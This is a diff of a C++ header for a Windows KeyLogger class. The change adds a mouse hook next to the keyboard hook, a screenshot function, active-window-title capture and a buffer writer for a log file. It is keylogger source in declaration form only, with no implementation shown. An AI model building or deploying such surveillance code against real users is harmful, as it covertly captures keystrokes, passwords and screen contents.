@@ -8,6 +8,9 @@
 #include <ctime>
 #include <fstream>
 #include <string>
+#include <sstream>
+
+#include "screenshot.h"
 
 //Keyboard codes
 #define SC_CTRL 29
@@ -17,34 +20,32 @@
 #define SC_SPACE 57
 #define SC_ENTER 28
 
-
 class KeyLogger {
 
     public:
 
+	//singleton
     static KeyLogger* getInstance();
     static void releaseInstance();
 
-    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
-
-    //starts logging keyboard input
+    //starts listenning
     void listen();
 
-    HHOOK getHook();
-
+	//alt keyboard modifier
     bool isAltDown();
     void setAltDown(bool down);
 
+	//ctrl keyboard modifier
     bool isCtrlDown();
     void setCtrlDown(bool down);
 
+	//left shift keyboard modifier
     bool isLShiftDown();
     void setLShiftDown(bool down);
 
+	//right shift
     bool isRShiftDown();
     void setRShiftDown(bool down);
-
-    std::string getActiveWindowTitle();
 
     protected:
 
@@ -55,7 +56,14 @@ class KeyLogger {
 
 	std::string getTimeString();
 
-    //singleton
+	void screenshot();
+
+	std::string getActiveWindowTitle();
+
+	void writeBuffer();
+
+	static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
+
     static KeyLogger* instance;
 
     bool altDown;
@@ -63,12 +71,13 @@ class KeyLogger {
     bool lshiftDown;
     bool rshiftDown;
 
-    HHOOK hook;
-
+    HHOOK khook, mhook;
+	
     std::ofstream logFile;
 	std::string logFilePath;
 
 	std::string keyboardBuffer;
+
 	std::string activeWindowTitle;
 };
 
